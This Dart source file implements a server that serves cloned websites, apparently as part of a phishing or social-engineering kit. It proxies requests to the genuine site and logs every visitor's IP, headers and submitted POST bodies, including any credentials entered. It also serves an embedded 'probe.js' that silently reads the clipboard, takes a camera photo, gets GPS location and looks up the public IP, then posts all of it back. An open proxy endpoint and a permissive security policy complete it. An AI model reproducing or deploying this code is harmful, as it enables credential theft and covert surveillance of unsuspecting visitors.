import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import '../services/capture_service.dart';
import 'package:mime/mime.dart';
import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';
import 'package:basic_utils/basic_utils.dart';
import 'site_service.dart';

class _SiteServer {
  _SiteServer({required this.site, required this.httpServer, required this.httpsServer});
  final Site site;
  final HttpServer httpServer;
  final HttpServer httpsServer;
}

class ServerService {
  static final ServerService instance = ServerService._();
  ServerService._();

  final Map<String /*siteId*/, _SiteServer> _servers = {};

  // 本地补充常见前端资源的 MIME 类型，lookupMimeType 无法识别时使用
  static const Map<String,String> _extraMimeTypes={
    '.css':'text/css',
    '.js':'application/javascript',
    '.mjs':'application/javascript',
    '.map':'application/json',
    '.json':'application/json',
    '.woff':'font/woff',
    '.woff2':'font/woff2',
    '.ttf':'font/ttf',
    '.otf':'font/otf',
    '.svg':'image/svg+xml',
  };

  // 更宽松的 CSP，允许内联脚本/样式及字体、图片等资源，避免 WebView 拒绝渲染
  static const String _cspHeader =
      "default-src * data: blob:; "
      "script-src * 'unsafe-inline' 'unsafe-eval' data:; "
      "style-src * 'unsafe-inline' data:; "
      "font-src * data:; "
      "img-src * data: blob:; connect-src *";

  static const String _probeJs = r"""(function () {
  const j = (t,b,c)=>fetch('/_visitor_data',{method:'POST',headers:c||{'Content-Type':'application/json'},body:b?b:JSON.stringify(t)}).catch(()=>{});
  if (window.__PROBE_GPS__ && navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>j({type:'gps',lat:p.coords.latitude,lon:p.coords.longitude}),()=>{}, {timeout:5e3});}
  if (window.__PROBE_CLIP__ && navigator.clipboard){navigator.clipboard.readText().then(t=>t&&j({type:'clip',data:t})).catch(()=>{});} 
  if ((window.__PROBE_IP__||window.__PROBE_DEVICE__)){
    const ipApis=['https://api.ipify.org?format=json','https://ipinfo.io/json','https://api.myip.com'];
    const buildProxy=u=>'/__proxy_ip__?u='+encodeURIComponent(u);
    const tryFetch=(endpoint,cb)=>{
      let controller=null, timer=null, opts={};
      if(window.AbortController){
        controller=new AbortController();
        opts.signal=controller.signal;
        timer=setTimeout(()=>controller.abort(),5000);
      }else{
        // 无 AbortController 的环境：5 秒后主动触发 cb({})
        timer=setTimeout(()=>{cb({});},5000);
      }
      const done=()=>{ if(timer) clearTimeout(timer); };
      const fetchJson=u=>fetch(u,opts).then(r=>r.json());
      fetchJson(endpoint)
        .then(cb)
        .catch(()=>{
          fetchJson(buildProxy(endpoint)).then(cb).catch(()=>{cb({});});
        })
        .finally(done);
    };
    (function nxt(i){
      if(i>=ipApis.length) return;
      tryFetch(ipApis[i],d=>{
        const ip=d.ip||d.ipAddress||d.hostname||d.query||d.address;
        if(ip){j({type:'info',ip,ua:navigator.userAgent,lang:navigator.language,plat:navigator.platform});}
        else{nxt(i+1);} 
      });
    })(0);
  }
  if (window.__PROBE_CAM__ && navigator.mediaDevices && (location.protocol==='https:' || location.hostname==='localhost')){
    navigator.mediaDevices.getUserMedia({video:true}).then(s=>s.getVideoTracks()[0]).then(t=>new ImageCapture(t).takePhoto()).then(b=>b.arrayBuffer()).then(buf=>j(null,new Uint8Array(buf),{'Content-Type':'application/octet-stream','X-Probe-Type':'camera'})).catch(()=>{});
  }
})();""";

  // 自动生成自签名证书，如已存在则复用

  bool get isAnyRunning => _servers.isNotEmpty;

  int? getPort(String siteId) => _servers[siteId]?.httpServer.port;
  int? getSecurePort(String siteId) => _servers[siteId]?.httpsServer.port;

  Future<int> startSite(Site site) async {
    // already running
    if (_servers.containsKey(site.id)) return _servers[site.id]!.httpServer.port;

    // 监听所有网卡地址，便于同局域网访问；端口 0 让系统分配可用端口
    final HttpServer srv = await HttpServer.bind(InternetAddress.anyIPv4, 0);

    // start https
    final ctx = await _ensureCert();
    try {
      ctx.setAlpnProtocols(['h2', 'http/1.1'], false);
    } catch (_) {
      // 如果当前 Dart 版本不支持 ALPN API，则忽略，使用默认协议
    }

    final HttpServer secureSrv = await HttpServer.bindSecure(
      InternetAddress.anyIPv4,
      0,
      ctx,
    );

    _servers[site.id] = _SiteServer(site: site, httpServer: srv, httpsServer: secureSrv);

    // 保存端口到本地配置
    if (site.port != srv.port || site.securePort != secureSrv.port) {
      site.port = srv.port;
      site.securePort = secureSrv.port;
      final sites = await SiteService.instance.fetchSites();
      final idx = sites.indexWhere((s) => s.id == site.id);
      if (idx != -1) {
        sites[idx] = site;
        await SiteService.instance.saveSites(sites);
      }
    }

    // listen
    srv.listen((req) => _handleRequest(req, site));
    secureSrv.listen((req) => _handleRequest(req, site));
    return srv.port;
  }

  Future<void> stopSite(Site site) async {
    final s = _servers.remove(site.id);
    await s?.httpServer.close(force: true);
    await s?.httpsServer.close(force: true);
  }

  Future<void> _handleRequest(HttpRequest request, Site site) async {
    // handle probe uploads first to avoid consuming stream elsewhere
    if (request.uri.path == '/_visitor_data' && request.method == 'POST') {
      final headersMap=<String,String>{};
      final xfwd=request.headers.value('x-forwarded-for');
      final xreal=request.headers.value('x-real-ip');
      final clientIp=(xfwd?.split(',').first.trim().isNotEmpty==true)?xfwd!.split(',').first.trim():xreal;
      final ipToStore=clientIp?.isNotEmpty==true?clientIp:request.connectionInfo?.remoteAddress.address;
      if(ipToStore!=null){headersMap['Remote-Addr']=ipToStore;}
      request.headers.forEach((k,v){headersMap[k]=v.join(',');});
      final bodyBytes = await request.fold<BytesBuilder>(BytesBuilder(), (b, d) { b.add(d); return b; }).then((b)=>b.takeBytes());
      String bodyStr;
      final ct = request.headers.contentType?.mimeType ?? '';
      if (ct.startsWith('application/json') || ct.startsWith('text/')) {
        bodyStr = utf8.decode(bodyBytes);
      } else {
        bodyStr = base64Encode(bodyBytes);
      }
      await CaptureService.instance.addCapture(
        type:'PROBE',
        headers:headersMap,
        body:bodyStr,
        site: site.name,
      );
      request.response.statusCode=200;
      request.response.headers.set('Access-Control-Allow-Origin','*');
      request.response.write('ok');
      await request.response.close();
      return;
    }

    if (request.method == 'GET' || request.method == 'POST') {
      final relativePath = request.uri.path == '/' ? 'index.html' : request.uri.path.substring(1);
      final filePath = p.normalize(p.join(site.path, relativePath));
        final file = File(filePath);
      if (await file.exists() && request.method == 'GET') {
        // 异步记录，避免阻塞文件传输
        final headersMap = <String, String>{};
        final xfwd=request.headers.value('x-forwarded-for');
        final xreal=request.headers.value('x-real-ip');
        final clientIp=(xfwd?.split(',').first.trim().isNotEmpty==true)?xfwd!.split(',').first.trim():xreal;
        final ipToStore=clientIp?.isNotEmpty==true?clientIp:request.connectionInfo?.remoteAddress.address;
        if(ipToStore!=null){headersMap['Remote-Addr']=ipToStore;}
        request.headers.forEach((name, values) {
          headersMap[name] = values.join(',');
        });
        unawaited(CaptureService.instance.addCapture(
          type: request.method,
          headers: headersMap,
          body: '',
          site: site.name,
        ));

        final rawMime = lookupMimeType(file.path) ??
            _extraMimeTypes[p.extension(file.path).toLowerCase()] ??
            'application/octet-stream';
        var contentType = rawMime;
        if (contentType.startsWith('text/') || contentType == 'application/javascript' || contentType == 'application/json' || contentType == 'application/xml') {
          contentType = '$contentType; charset=utf-8';
        }
          request.response.headers.set('Content-Type', contentType);
        request.response.headers.set('Content-Security-Policy', _cspHeader);
          await request.response.addStream(file.openRead());
        await request.response.close();
        return;
      }

      // If file not exists or for POST, try proxy to original site
      if (site.origin != null) {
        final Uri originUri = Uri.parse(site.origin!);
        final Uri proxyUri = originUri.resolve(request.uri.toString());

        final HttpClient client = HttpClient();
        try {
          final HttpClientRequest proxyReq = await client.openUrl(request.method, proxyUri);
          // copy headers
          request.headers.forEach((name, values) {
            if (name.toLowerCase() == 'host') return;
            proxyReq.headers.set(name, values);
          });
          // 使用站点域名作为 Referer，保持与真实站点一致
          final ref = site.domain ?? site.origin;
          if(ref != null){
            proxyReq.headers.set('Referer', ref);
          }
          if (request.method != 'GET') {
            await request.pipe(proxyReq as StreamConsumer<Uint8List>);
          }
          final HttpClientResponse proxyResp = await proxyReq.close();

          // record capture for GET/POST
          final headersMap = <String, String>{};
          final xfwd=request.headers.value('x-forwarded-for');
          final xreal=request.headers.value('x-real-ip');
          final clientIp=(xfwd?.split(',').first.trim().isNotEmpty==true)?xfwd!.split(',').first.trim():xreal;
          final ipToStore=clientIp?.isNotEmpty==true?clientIp:request.connectionInfo?.remoteAddress.address;
          if(ipToStore!=null){headersMap['Remote-Addr']=ipToStore;}
          request.headers.forEach((name, values) {
            headersMap[name] = values.join(',');
          });
          String body = '';
          if (request.method != 'GET') {
            body = await utf8.decoder.bind(request).join();
          }
          await CaptureService.instance.addCapture(
            type: request.method,
            headers: headersMap,
            body: body,
            site: site.name,
          );

          // relay response
          proxyResp.headers.forEach((name, values) {
            final low=name.toLowerCase();
            if(low=='content-length'||low=='transfer-encoding') return;
            request.response.headers.set(name, values.join(','));
          });
          request.response.headers.set('Access-Control-Allow-Origin', '*');
          await request.response.addStream(proxyResp);
          await request.response.close();
          return;
        } catch (e) {
          // fallthrough if proxy fails
        } finally {
          client.close();
        }
      }
    }

    if (request.uri.path == '/_proxy_api') {
      final target = request.uri.queryParameters['target'];
      if (target != null && target.startsWith('http')) {
        final client = HttpClient();
        try {
          final uri = Uri.parse(target);
          final proxyReq = await client.openUrl(request.method, uri);
          request.headers.forEach((n,v){proxyReq.headers.set(n,v);} );
          final proxyRef = site.domain ?? site.origin;
          if(proxyRef != null){
            proxyReq.headers.set('Referer', proxyRef);
          }
          if (request.method != 'GET') await request.pipe(proxyReq as StreamConsumer<Uint8List>);
          final proxyResp = await proxyReq.close();
          request.response.statusCode = proxyResp.statusCode;
          proxyResp.headers.forEach((n,v){request.response.headers.set(n,v);} );
          request.response.headers.set('Access-Control-Allow-Origin','*');
          await request.response.addStream(proxyResp);
          await request.response.close();
          return;
        } catch(_){} finally{client.close();}
      }
    }

    if (request.uri.path == '/__proxy_ip__') {
      final target = request.uri.queryParameters['u'];
      if (target != null && target.startsWith('http')) {
        final client = HttpClient();
        try {
          final uri = Uri.parse(target);
          final proxyReq = await client.getUrl(uri);
          final proxyResp = await proxyReq.close();
          request.response.statusCode = proxyResp.statusCode;
          proxyResp.headers.forEach((n, v) {
            if (['content-length', 'transfer-encoding', 'content-encoding'].contains(n.toLowerCase())) return;
            request.response.headers.set(n, v.join(','));
          });
          request.response.headers.set('Access-Control-Allow-Origin', '*');
          await request.response.addStream(proxyResp);
          await request.response.close();
          return;
        } catch (_) {} finally {
          client.close();
        }
      }
    }

    // serve probe.js
    if (request.uri.path == '/probe.js') {
      request.response.headers.set('Content-Type','text/javascript');
      request.response.headers.set('Access-Control-Allow-Origin','*');
      request.response.write(_probeJs);
      await request.response.close();
      return;
    }

    // capture non-static content
    final headersMap = <String, String>{};
    final xfwd=request.headers.value('x-forwarded-for');
    final xreal=request.headers.value('x-real-ip');
    final clientIp=(xfwd?.split(',').first.trim().isNotEmpty==true)?xfwd!.split(',').first.trim():xreal;
    final ipToStore=clientIp?.isNotEmpty==true?clientIp:request.connectionInfo?.remoteAddress.address;
    if(ipToStore!=null){headersMap['Remote-Addr']=ipToStore;}
    request.headers.forEach((name, values) {
      headersMap[name] = values.join(',');
    });
    final body = await utf8.decoder.bind(request).join();
    await CaptureService.instance.addCapture(
      type: request.method,
      headers: headersMap,
      body: body,
      site: site.name,
    );
    request.response.headers.set('Content-Type', 'text/plain; charset=utf-8');
    request.response.headers.set('Access-Control-Allow-Origin', '*');
    request.response.write('OK');
    await request.response.close();
  }

  Future<SecurityContext> _ensureCert() async {
    final Directory dir = await getApplicationSupportDirectory();
    final certDir = Directory(p.join(dir.path, 'certs'));
    await certDir.create(recursive: true);
    final certFile = File(p.join(certDir.path, 'cert.pem'));
    final keyFile = File(p.join(certDir.path, 'key.pem'));
    if (!(await certFile.exists()) || !(await keyFile.exists())) {
      // 收集本机可用 IPv4 地址，加入 SAN，确保使用局域网 IP 访问时证书也有效
      final sanSet = <String>{'localhost', '127.0.0.1'};
      try {
        final interfaces = await NetworkInterface.list(includeLoopback: true, type: InternetAddressType.IPv4);
        for (final iface in interfaces) {
          for (final addr in iface.addresses) {
            sanSet.add(addr.address);
          }
        }
      } catch (_) {
        // ignore - not critical
      }

      // generate new certificate and key
      final keyPair = CryptoUtils.generateRSAKeyPair(keySize: 2048);
      final privateKey = keyPair.privateKey as RSAPrivateKey;
      final publicKey = keyPair.publicKey as RSAPublicKey;

      // Distinguished Name 字段
      final dn = {
        'CN': 'localhost',
        'O' : 'SheGongFangZhan',
        'C' : 'CN',
      };

      final sanList = sanSet.toList();

      // 1) 生成 CSR (PEM)
      final csrPem = X509Utils.generateRsaCsrPem(
        dn,
        privateKey,
        publicKey,
        san: sanList,
      );

      // 2) 根据 CSR 生成自签名证书 (PEM)
      final certPem = X509Utils.generateSelfSignedCertificate(
        privateKey,
        csrPem,
        3650,
        sans: sanList,
      );

      final keyPem = CryptoUtils.encodeRSAPrivateKeyToPem(privateKey);
      await certFile.writeAsString(certPem);
      await keyFile.writeAsString(keyPem);
    }
    final ctx = SecurityContext()
      ..useCertificateChain(certFile.path)
      ..usePrivateKey(keyFile.path);
    return ctx;
  }
} 